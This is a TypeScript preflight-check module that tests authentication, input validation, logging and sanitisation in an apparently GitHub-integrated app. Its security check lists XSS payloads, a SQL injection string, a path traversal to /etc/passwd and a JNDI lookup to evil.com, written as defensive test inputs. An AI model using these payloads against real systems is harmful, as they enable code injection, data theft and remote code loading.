/**
 * Comprehensive Pre-flight Check System
 * 
 * Validates system functionality before marking tasks as complete.
 * Tests all critical paths including error handling and edge cases.
 */

import { logger } from './logger';
import { validator } from './validation';
import { userDataIsolation } from './userDataIsolation';

export interface PreflightCheckResult {
  name: string;
  status: 'pass' | 'fail' | 'warning';
  message: string;
  details?: any;
  duration: number;
}

export interface PreflightReport {
  timestamp: string;
  totalChecks: number;
  passed: number;
  failed: number;
  warnings: number;
  overallStatus: 'pass' | 'fail' | 'warning';
  checks: PreflightCheckResult[];
  summary: string;
}

class PreflightChecker {
  private static instance: PreflightChecker;

  private constructor() {}

  public static getInstance(): PreflightChecker {
    if (!PreflightChecker.instance) {
      PreflightChecker.instance = new PreflightChecker();
    }
    return PreflightChecker.instance;
  }

  /**
   * Run a single check with timing and error handling
   */
  private async runCheck(
    name: string,
    checkFunction: () => Promise<{ status: 'pass' | 'fail' | 'warning'; message: string; details?: any }>
  ): Promise<PreflightCheckResult> {
    const startTime = performance.now();
    
    try {
      logger.debug('Running preflight check', { checkName: name }, 'PREFLIGHT');
      
      const result = await checkFunction();
      const duration = performance.now() - startTime;
      
      logger.debug('Preflight check completed', {
        checkName: name,
        status: result.status,
        duration
      }, 'PREFLIGHT');
      
      return {
        name,
        status: result.status,
        message: result.message,
        details: result.details,
        duration
      };
    } catch (error) {
      const duration = performance.now() - startTime;
      
      logger.error('Preflight check failed with exception', error as Error, {
        checkName: name,
        duration
      }, 'PREFLIGHT');
      
      return {
        name,
        status: 'fail',
        message: `Check failed with error: ${(error as Error).message}`,
        details: { error: (error as Error).stack },
        duration
      };
    }
  }

  /**
   * Check authentication system
   */
  private async checkAuthentication(): Promise<{ status: 'pass' | 'fail' | 'warning'; message: string; details?: any }> {
    // Test token validation
    const validToken = 'github_12345_1640995200000_dGVzdF90b2tlbg==';
    const validRefresh = 'refresh_12345_1640995200000';
    
    // Test valid token
    const validResult = userDataIsolation.initializeSession(validToken, validRefresh);
    if (!validResult) {
      return {
        status: 'fail',
        message: 'Valid token initialization failed',
        details: { validToken: validToken.substring(0, 20) + '...' }
      };
    }

    // Test invalid token (should fail gracefully)
    const invalidResult = userDataIsolation.initializeSession('invalid_token', 'invalid_refresh');
    if (invalidResult) {
      return {
        status: 'fail',
        message: 'Invalid token was accepted (security issue)',
        details: { invalidTokenAccepted: true }
      };
    }

    // Test expired token
    const expiredToken = 'github_12345_1000000000000_dGVzdF90b2tlbg=='; // Very old timestamp
    const expiredResult = userDataIsolation.initializeSession(expiredToken, validRefresh);
    if (expiredResult) {
      return {
        status: 'fail',
        message: 'Expired token was accepted (security issue)',
        details: { expiredTokenAccepted: true }
      };
    }

    return {
      status: 'pass',
      message: 'Authentication system working correctly',
      details: {
        validTokenTest: 'pass',
        invalidTokenTest: 'pass',
        expiredTokenTest: 'pass'
      }
    };
  }

  /**
   * Check validation system
   */
  private async checkValidation(): Promise<{ status: 'pass' | 'fail' | 'warning'; message: string; details?: any }> {
    const testCases = [
      // Valid data
      {
        name: 'valid_user_data',
        data: { name: 'John Doe', email: 'john@example.com' },
        schema: {
          name: { type: 'string' as const, required: true, minLength: 1 },
          email: { type: 'email' as const, required: true }
        },
        expectedValid: true
      },
      // Invalid email
      {
        name: 'invalid_email',
        data: { name: 'John Doe', email: 'invalid-email' },
        schema: {
          name: { type: 'string' as const, required: true },
          email: { type: 'email' as const, required: true }
        },
        expectedValid: false
      },
      // XSS attempt
      {
        name: 'xss_attempt',
        data: { name: '<script>alert("xss")</script>', email: 'test@example.com' },
        schema: {
          name: { type: 'string' as const, required: true },
          email: { type: 'email' as const, required: true }
        },
        expectedValid: true // Should be sanitized
      },
      // Missing required field
      {
        name: 'missing_required',
        data: { email: 'test@example.com' },
        schema: {
          name: { type: 'string' as const, required: true },
          email: { type: 'email' as const, required: true }
        },
        expectedValid: false
      }
    ];

    const results: any[] = [];
    let failedTests = 0;

    for (const testCase of testCases) {
      const result = validator.validate(testCase.data, testCase.schema);
      const passed = result.isValid === testCase.expectedValid;
      
      if (!passed) {
        failedTests++;
      }

      results.push({
        name: testCase.name,
        passed,
        expected: testCase.expectedValid,
        actual: result.isValid,
        errors: result.errors,
        sanitizedData: result.sanitizedData
      });
    }

    if (failedTests > 0) {
      return {
        status: 'fail',
        message: `${failedTests} validation tests failed`,
        details: { results, failedCount: failedTests }
      };
    }

    return {
      status: 'pass',
      message: 'All validation tests passed',
      details: { results, testCount: testCases.length }
    };
  }

  /**
   * Check error handling system
   */
  private async checkErrorHandling(): Promise<{ status: 'pass' | 'fail' | 'warning'; message: string; details?: any }> {
    const testResults: any[] = [];

    // Test logger error handling
    try {
      logger.error('Test error for preflight check', new Error('Test error'), {
        testContext: 'preflight',
        testId: 'error_handling_test'
      }, 'PREFLIGHT_TEST');
      testResults.push({ test: 'logger_error', status: 'pass' });
    } catch (error) {
      testResults.push({ 
        test: 'logger_error', 
        status: 'fail', 
        error: (error as Error).message 
      });
    }

    // Test structured logging
    try {
      const traceId = logger.generateTraceId();
      logger.setTraceId(traceId);
      
      if (logger.getTraceId() !== traceId) {
        testResults.push({ 
          test: 'trace_id', 
          status: 'fail', 
          error: 'Trace ID not set correctly' 
        });
      } else {
        testResults.push({ test: 'trace_id', status: 'pass' });
      }
    } catch (error) {
      testResults.push({ 
        test: 'trace_id', 
        status: 'fail', 
        error: (error as Error).message 
      });
    }

    // Test security logging
    try {
      logger.security('Test security event for preflight', 'low', {
        testContext: 'preflight',
        testId: 'security_test'
      });
      testResults.push({ test: 'security_logging', status: 'pass' });
    } catch (error) {
      testResults.push({ 
        test: 'security_logging', 
        status: 'fail', 
        error: (error as Error).message 
      });
    }

    const failedTests = testResults.filter(t => t.status === 'fail');
    
    if (failedTests.length > 0) {
      return {
        status: 'fail',
        message: `${failedTests.length} error handling tests failed`,
        details: { results: testResults, failedTests }
      };
    }

    return {
      status: 'pass',
      message: 'Error handling system working correctly',
      details: { results: testResults }
    };
  }

  /**
   * Check GitHub API integration (mock test)
   */
  private async checkGitHubIntegration(): Promise<{ status: 'pass' | 'fail' | 'warning'; message: string; details?: any }> {
    // Since we can't test real GitHub API without tokens, we'll test the structure
    const testResults: any[] = [];

    // Test rate limit handling structure
    try {
      // This would normally test actual API calls, but we'll test the structure
      const mockRateLimit = {
        limit: 5000,
        remaining: 4999,
        reset: Math.floor(Date.now() / 1000) + 3600,
        used: 1
      };

      // Validate rate limit structure
      const rateLimitValidation = validator.validate(mockRateLimit, {
        limit: { type: 'number' as const, required: true, min: 0 },
        remaining: { type: 'number' as const, required: true, min: 0 },
        reset: { type: 'number' as const, required: true, min: 0 },
        used: { type: 'number' as const, required: true, min: 0 }
      });

      if (rateLimitValidation.isValid) {
        testResults.push({ test: 'rate_limit_structure', status: 'pass' });
      } else {
        testResults.push({ 
          test: 'rate_limit_structure', 
          status: 'fail', 
          errors: rateLimitValidation.errors 
        });
      }
    } catch (error) {
      testResults.push({ 
        test: 'rate_limit_structure', 
        status: 'fail', 
        error: (error as Error).message 
      });
    }

    // Test user data validation structure
    try {
      const mockUserData = {
        id: 12345,
        login: 'testuser',
        name: 'Test User',
        email: 'test@example.com',
        avatar_url: 'https://example.com/avatar.jpg',
        public_repos: 10,
        followers: 5,
        following: 3,
        created_at: '2020-01-01T00:00:00Z',
        updated_at: '2023-01-01T00:00:00Z'
      };

      const userValidation = validator.validate(mockUserData, {
        id: { type: 'number' as const, required: true },
        login: { type: 'string' as const, required: true },
        name: { type: 'string' as const, required: false },
        email: { type: 'string' as const, required: false },
        avatar_url: { type: 'url' as const, required: true },
        public_repos: { type: 'number' as const, required: true, min: 0 },
        followers: { type: 'number' as const, required: true, min: 0 },
        following: { type: 'number' as const, required: true, min: 0 },
        created_at: { type: 'string' as const, required: true },
        updated_at: { type: 'string' as const, required: true }
      });

      if (userValidation.isValid) {
        testResults.push({ test: 'user_data_validation', status: 'pass' });
      } else {
        testResults.push({ 
          test: 'user_data_validation', 
          status: 'fail', 
          errors: userValidation.errors 
        });
      }
    } catch (error) {
      testResults.push({ 
        test: 'user_data_validation', 
        status: 'fail', 
        error: (error as Error).message 
      });
    }

    const failedTests = testResults.filter(t => t.status === 'fail');
    
    if (failedTests.length > 0) {
      return {
        status: 'fail',
        message: `${failedTests.length} GitHub integration tests failed`,
        details: { results: testResults, failedTests }
      };
    }

    return {
      status: 'pass',
      message: 'GitHub integration structure validated',
      details: { results: testResults }
    };
  }

  /**
   * Check security measures
   */
  private async checkSecurity(): Promise<{ status: 'pass' | 'fail' | 'warning'; message: string; details?: any }> {
    const testResults: any[] = [];

    // Test XSS prevention
    const xssPayloads = [
      '<script>alert("xss")</script>',
      'javascript:alert("xss")',
      '<img src="x" onerror="alert(\'xss\')" />',
      '<svg onload="alert(\'xss\')" />',
      'data:text/html,<script>alert("xss")</script>'
    ];

    for (const payload of xssPayloads) {
      const result = validator.validateField(payload, { type: 'string', required: true }, 'test');
      if (result.isValid && result.sanitizedValue !== payload) {
        testResults.push({ 
          test: `xss_prevention_${xssPayloads.indexOf(payload)}`, 
          status: 'pass',
          original: payload,
          sanitized: result.sanitizedValue
        });
      } else if (result.sanitizedValue === payload) {
        testResults.push({ 
          test: `xss_prevention_${xssPayloads.indexOf(payload)}`, 
          status: 'fail',
          error: 'XSS payload not sanitized',
          payload
        });
      }
    }

    // Test input validation
    const maliciousInputs = [
      { input: "'; DROP TABLE users; --", field: 'username' },
      { input: '../../../etc/passwd', field: 'filename' },
      { input: '${jndi:ldap://evil.com/a}', field: 'log_entry' }
    ];

    for (const test of maliciousInputs) {
      const result = validator.validateField(test.input, { type: 'string', required: true }, test.field);
      if (result.isValid && result.sanitizedValue !== test.input) {
        testResults.push({ 
          test: `injection_prevention_${test.field}`, 
          status: 'pass',
          original: test.input,
          sanitized: result.sanitizedValue
        });
      } else {
        testResults.push({ 
          test: `injection_prevention_${test.field}`, 
          status: 'warning',
          message: 'Input not sanitized but may be handled elsewhere',
          input: test.input
        });
      }
    }

    const failedTests = testResults.filter(t => t.status === 'fail');
    const warningTests = testResults.filter(t => t.status === 'warning');
    
    if (failedTests.length > 0) {
      return {
        status: 'fail',
        message: `${failedTests.length} security tests failed`,
        details: { results: testResults, failedTests, warningTests }
      };
    }

    if (warningTests.length > 0) {
      return {
        status: 'warning',
        message: `${warningTests.length} security tests have warnings`,
        details: { results: testResults, warningTests }
      };
    }

    return {
      status: 'pass',
      message: 'All security tests passed',
      details: { results: testResults }
    };
  }

  /**
   * Run comprehensive pre-flight checks
   */
  public async runPreflightChecks(): Promise<PreflightReport> {
    const startTime = Date.now();
    
    logger.info('Starting comprehensive preflight checks', {
      timestamp: new Date().toISOString()
    }, 'PREFLIGHT');

    const checks: PreflightCheckResult[] = [];

    // Run all checks
    const checkFunctions = [
      { name: 'Authentication System', fn: () => this.checkAuthentication() },
      { name: 'Input Validation', fn: () => this.checkValidation() },
      { name: 'Error Handling', fn: () => this.checkErrorHandling() },
      { name: 'GitHub Integration', fn: () => this.checkGitHubIntegration() },
      { name: 'Security Measures', fn: () => this.checkSecurity() }
    ];

    for (const check of checkFunctions) {
      const result = await this.runCheck(check.name, check.fn);
      checks.push(result);
    }

    // Calculate summary
    const passed = checks.filter(c => c.status === 'pass').length;
    const failed = checks.filter(c => c.status === 'fail').length;
    const warnings = checks.filter(c => c.status === 'warning').length;

    let overallStatus: 'pass' | 'fail' | 'warning';
    let summary: string;

    if (failed > 0) {
      overallStatus = 'fail';
      summary = `${failed} critical issues found that must be resolved before deployment`;
    } else if (warnings > 0) {
      overallStatus = 'warning';
      summary = `${warnings} warnings found that should be addressed`;
    } else {
      overallStatus = 'pass';
      summary = 'All systems operational and ready for production';
    }

    const report: PreflightReport = {
      timestamp: new Date().toISOString(),
      totalChecks: checks.length,
      passed,
      failed,
      warnings,
      overallStatus,
      checks,
      summary
    };

    const duration = Date.now() - startTime;

    logger.info('Preflight checks completed', {
      duration,
      overallStatus,
      passed,
      failed,
      warnings,
      summary
    }, 'PREFLIGHT');

    return report;
  }

  /**
   * Generate a formatted report for display
   */
  public formatReport(report: PreflightReport): string {
    const statusEmoji = {
      pass: '✅',
      fail: '❌',
      warning: '⚠️'
    };

    let output = `\n🔍 PREFLIGHT CHECK REPORT\n`;
    output += `═══════════════════════════════════════\n`;
    output += `Timestamp: ${report.timestamp}\n`;
    output += `Overall Status: ${statusEmoji[report.overallStatus]} ${report.overallStatus.toUpperCase()}\n`;
    output += `Summary: ${report.summary}\n\n`;

    output += `📊 RESULTS SUMMARY\n`;
    output += `─────────────────────────────────────\n`;
    output += `Total Checks: ${report.totalChecks}\n`;
    output += `✅ Passed: ${report.passed}\n`;
    output += `❌ Failed: ${report.failed}\n`;
    output += `⚠️  Warnings: ${report.warnings}\n\n`;

    output += `📋 DETAILED RESULTS\n`;
    output += `─────────────────────────────────────\n`;

    for (const check of report.checks) {
      output += `${statusEmoji[check.status]} ${check.name}\n`;
      output += `   Message: ${check.message}\n`;
      output += `   Duration: ${check.duration.toFixed(2)}ms\n`;
      
      if (check.details && Object.keys(check.details).length > 0) {
        output += `   Details: ${JSON.stringify(check.details, null, 2).replace(/\n/g, '\n   ')}\n`;
      }
      output += `\n`;
    }

    if (report.failed > 0) {
      output += `🚨 CRITICAL ISSUES REQUIRING IMMEDIATE ATTENTION\n`;
      output += `═══════════════════════════════════════════════\n`;
      const failedChecks = report.checks.filter(c => c.status === 'fail');
      for (const check of failedChecks) {
        output += `❌ ${check.name}: ${check.message}\n`;
      }
      output += `\nThese issues must be resolved before the system can be considered production-ready.\n`;
    }

    return output;
  }
}

// Export singleton instance
export const preflightChecker = PreflightChecker.getInstance();

// Convenience function for running checks
export const runPreflightChecks = () => preflightChecker.runPreflightChecks();

export default preflightChecker;